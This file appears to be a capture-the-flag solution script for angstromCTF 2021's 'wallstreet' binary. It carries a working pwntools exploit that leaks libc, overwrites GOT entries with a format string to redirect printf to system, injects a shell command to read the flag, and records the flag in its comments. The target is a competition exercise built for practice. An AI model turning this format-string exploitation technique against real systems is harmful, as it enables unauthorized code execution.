#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.2021.chall.actf.co --port 21800 ./wallstreet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./wallstreet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.2021.chall.actf.co'
port = int(args.PORT or 21800)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004014a7
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start(env={'LD_PRELOAD': './libc.so.6'})
libc = ELF('./libc.so.6')

# -16 gives you libc leak
# 43 gives you stack leak. 
# This is the stack leak:
# 0x00007ffdc7195f78│+0x0168: 0x00007ffdc7196050  →  0x00007ffdc7196150  →  0x0000000000000001
# libc start main 0000000000028bc0
# one_gadget 0xdf735
# so I have to add 0xb6b75


io.sendlineafter('stonks!', '1')
io.sendlineafter('see?\n', str(-16))
libc.address = u64(io.recv(6) + b'\x00\x00') - (0x7f85778446c0 - 0x00007f8577660000)
log.info(f'Libc leak: {hex(libc.address)}')


# Write putchar got address on the stack
# Using an already existing program base pointer

# 8 to use pointer at rsp+0x10
# # rbp is at rsp+0x230
# 0x00007ffdc7195f60│+0x0150: 0x00007ffdc7196060  →  0x0000000000401560  →  <__libc_csu_init+0> endbr64
to_write = exe.got['putchar'] & 0xFFFF
to_write -= 0x66 - 1 # the %.*ms
offset = (0x150 - 0x10) // 8 + 8
if not args.LOCAL:
    to_write += 4 # internal stack changes also change the %.*ms output
format_str = b'%' + str(to_write).encode() + b'm%' + offset*b'%.*m' + b'%hn'


# 0x00007ffde2345760│+0x0250: 0x0000000000404018  →  0x0000000000401030  →   endbr64
# This is the offset that will be modified by the first half of the format string
# It will be a pointer to putchar got
# We write main address to it
to_write = 0xFFFF - to_write + 1 + (exe.sym['main'] & 0xFFFF) - 101
if not args.LOCAL:
    to_write += 4

offset = (0x250 - 0x10) // 8 + 8
format_str += b'%' + str(to_write).encode() + b'm%' + str(offset).encode() + b'$hn'

io.sendlineafter('What is your API token?\n', format_str)
io.recvuntil('Buying stonks with token:\n')
log.info(f'Printed: {len(io.recvline())-1}') # n of characters printed by printf


# SECOND PASS!!
io.sendlineafter('stonks!', '1')
io.sendlineafter('see?\n', str(0))

# Write printf got address to stack
to_write = exe.got['printf'] # Printed: 4210736
to_write -= 0x66 - 1 + 0x103 - 0x30
offset = (0x168 - 0x10) // 8 + 8
format_str = b'%' + str(to_write).encode() + b'm%' + offset*b'%.*m' + b'%n'

# Write lower 4 bytes of system to printf got
to_write = 0xFFFF - to_write + 1 + (libc.sym['system'] & 0xFFFFFFFF) - 101 - 65747
offset = (0x240 - 0x10) // 8 + 8
format_str += b'%' + str(to_write).encode() + b'm%' + str(offset).encode() + b'$n'

io.sendlineafter('What is your API token?\n', format_str)
io.recvuntil('Buying stonks with token:\n')
log.info(f'Printed: {len(io.recvline())-1}')

# THIRD PASS!
# Instead of printf we call system
# But there is still the filter to go through
# So I use $($0)
# also we seem to receive only stderr for some reason lol
# so I redirect stdout to stderr
# io.interactive()
io.sendlineafter('stonks!', '1')
io.sendlineafter('see?\n', str(43))
io.sendlineafter('What is your API token?\n', '$($0)')
io.sendlineafter('Buying stonks with token:\n', 'cat flag.txt 1>&2')
io.interactive() 

# actf{i_thought_i_had_it_all_together_but_i_was_led_astray_the_day_you_stack_pivoted_5e1d1028cc862facee3d95ea}
# we did not stack pivot at all hehehe
